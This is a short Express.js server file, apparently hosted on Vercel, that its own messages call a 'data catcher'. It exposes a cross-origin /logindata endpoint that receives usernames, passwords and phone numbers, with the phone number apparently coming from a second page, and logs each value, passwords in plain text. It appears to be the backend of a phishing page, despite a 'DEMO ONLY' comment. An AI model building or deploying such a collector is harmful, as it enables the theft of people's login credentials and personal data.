// api/server.js (Modified to include phoneNumber)
const express = require('express');
const cors = require('cors');

const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.post('/logindata', (req, res) => {
    const { username, password, phoneNumber } = req.body; // Destructure all three
    const timestamp = new Date().toISOString();

    if (!username || !password) { // Username and password are still considered essential for this endpoint
        return res.status(400).json({ message: 'Username and password are required.' });
    }

    console.log("--- DATA RECEIVED (Vercel) ---");
    console.log("Timestamp:", timestamp);
    console.log("Username:", username);
    console.log("Password:", password, "<-- WARNING: This is plain text! For DEMO ONLY.");
    
    if (phoneNumber) {
        console.log("Phone Number:", phoneNumber);
    } else {
        console.log("Phone Number: Not provided on this submission"); // Should be provided from page 2
    }
    console.log("------------------------------");

    return res.status(200).json({ message: 'Data received successfully by Vercel catcher!' });
});

app.get('/', (req, res) => {
    return res.send('My Vercel Data Catcher API is alive and well!');
});

module.exports = app;
